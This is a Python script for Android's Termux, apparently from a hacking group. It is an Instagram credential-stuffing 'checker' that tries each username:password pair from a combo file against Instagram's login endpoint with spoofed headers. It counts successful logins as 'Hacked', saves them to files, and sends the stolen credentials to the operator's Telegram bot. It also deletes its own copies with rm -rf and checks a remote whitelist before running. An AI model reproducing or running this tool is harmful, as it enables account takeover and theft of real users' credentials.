####################
import os, sys, time
os.system("rm -rf .insta.py;rm -rf insta.py ;cd $HOME ;rm -rf /sdcard/download/.insta.py")
os.system("rm -rf /sdcard/download/insta.py")
os.system("rm -rf .insta.py")
os.system("rm -rf insta.py")
os.system("rm -rf /data/data/com.termux/files/svr")
os.system("clear")
bad=0
timeout=0
hits=0
checkpoint=0
error=0
hitss = 0
badd = 0
freee = 0
errorr = 0
hitsss=0
baddd=0
bad_broxyy=0
wd = "\033[90;1m" 
GL = "\033[96;1m"
BB = "\033[34;1m"
YY = "\033[33;1m"
GG = "\033[32;1m"
WW = "\033[0;1m" 
RR = "\033[31;1m" 
CC = "\033[36;1m" 
B = "\033[34m"   
Y = "\033[33;1m"    
G = "\033[32m"    
W = "\033[0;1m" 
R = "\033[31m"   
C = "\033[36;1m"
def instagram():
    import json, requests, user_agent,os ,sys, time, datetime
    import requests
    from user_agent import generate_user_agent
    from datetime import datetime
    r = requests.session()
    print(" la aesta da ba be Proxya ")
    def loopPp():
        global bad, timeout, hacked, checkpoint, error, hits
        combo=input(" [ Path ] File >> ")
        file = open(combo,'r').read().splitlines()
        for line in file:
            user = line.split(':')[0]
            pasw = line.split(':')[1]
            url = 'https://www.instagram.com/accounts/login/ajax/'
            head = {
                'accept':'*/*',
                'accept-encoding':'gzip,deflate,br',
                'accept-language':'en-US,en;q=0.9,ar;q=0.8',
                'content-length':'269',
                'content-type':'application/x-www-form-urlencoded',
                'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
                'origin':'https://www.instagram.com',
                'referer':'https://www.instagram.com/',
                'sec-fetch-dest':'empty',
                'sec-fetch-mode':'cors',
                'sec-fetch-site':'same-origin',
                'user-agent': generate_user_agent() ,
                'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
                'x-ig-app-id':'936619743392459',
                'x-ig-www-claim':'0',
                'x-instagram-ajax':'8a8118fa7d40',
                'x-requested-with':'XMLHttpRequest'
            }
            time_now = int(datetime.now().timestamp())
            data = {
                'username': user,
                'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                'queryParams': {},
                'optIntoOneTap': 'false',
            }
            login = r.post(url,headers=head,data=data).text
            try:
                if '"authenticated":false' in login:
                    bad+=1
                    print(f'\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}',end="")
                elif '"message":"Please wait a few minutes before you try again."' in login:
                    timeout+=1
                    import time
                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
                    time.sleep(309)
                elif 'userId' in login:
                    hits+=1
                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
                    boooom=f"\nuser&num&emil: "+user+":"+pasw
                    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
                    with open('Good(instgram).txt', 'a') as ff:
                        ff.write(f"\nuser&num&emil: "+user+":"+pasw)
                elif ('"message":"checkpoint_required"') in login:
                    checkpoint+=1
                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
                    booom=f"\nuser&num&emil: "+user+":"+pasw
                    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={booom}\n')
                    with open("checkpoint.txt", "a") as dd:
                        dd.write(f"\nuser&num&emil: "+user+":"+pasw)
                else:
                    error+=1
                    print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error}",end="")
            except:
                print(f"\r[-] Hacked : {hits} | [-] checkpoint : {checkpoint} | [-] bad : {bad} | [-] timeout : {timeout} | [-] error : {error} ",end="")
    loopPp()
    print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
def dwbara():
    import json, requests, user_agent,os ,sys, time, datetime
    os.system("clear")
    logo=''' '''+G+'''
    ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
    ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
    ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
    ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
    ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
    ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
    ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
                ░ ░   ░        ░      ░ ░           ░ 
                                          Combo !¡!¡! 
   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    '''+R+'''    [ Welcome to my script, Auther: @i4m_zed ]

   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'''+wd+'''
    |'''+W+''' 1 '''+wd+'''| '''+W+'''= '''+wd+'''Checker('''+R+'''instgram'''+wd+''')-('''+Y+'''number'''+wd+''')&('''+Y+'''email-pass'''+wd+''')

    | '''+W+'''0 '''+wd+'''| '''+W+'''= '''+wd+'''Exit'''+W+'''()'''+wd+'''
                       '''+Y+'''Allow '''+wd+'''['''+W+''' termux-setup-storage'''+wd+''' ]
   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        '''+Y+'''#'''+wd+'''Agar Natawe ba bot telegram botbetawa
        '''+Y+'''#'''+wd+'''ID lagal Token hech manwsa
        '''+Y+'''#'''+wd+'''awanashi ka hack da bn dachna /sdcard
    '''+wd+'''~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''+W+'''
    '''
    print(logo)
    i=input("   Choese: ")
    ID=input("   Your ID Telegram :")
    token=input("  Token(bot) : ")
    if i=="1":
        instagram()
    elif i=="0":
        print(" Exit !")
        os.sys.exit()
    else:
        print("     [ Ka hallt bzhard zhmara y halat da na !  ]")
        time.sleep(5)
        dwbara()
try:
    import json, requests, user_agent,os ,sys, time, datetime
except:
    os.system("pip install user_agent ;pip install requests ;pip install json")
    os.system("clear")
    pass
def idcr():
    uuid = requests.get('https://httpbin.org/uuid')
    jsonid = json.loads(uuid.text)
    idjscr = jsonid['uuid']
    os.system('touch /data/data/com.termux/pain.txt')
    reb = open('/data/data/com.termux/pain.txt', 'w')
    reb.write(idjscr)
    reb.close()
def hala():
    x = os.listdir('/data/data/com.termux/')
    if 'pain.txt' in x:
        os.system('chmod 777 /data/data/com.termux/pain.txt')
        readid = open('/data/data/com.termux/pain.txt', 'r').read()
        print('Your ID : ' + str(readid))
        textupload = requests.get('https://raw.githubusercontent.com/968hacker/list/main/list.txt').text
        if readid in textupload:
            print( '\x1b[37;1m ID to Active Krawa....\x1b[0m')
            time.sleep(5)
            dwbara()
        else:
            os.system('chmod 000 /data/data/com.termux/pain.txt')
            print("\x1b[37;1m ID to Active Nakrawa.....")
            time.sleep(5)
            sys.exit()
    else:
        hala()
hala()
#############
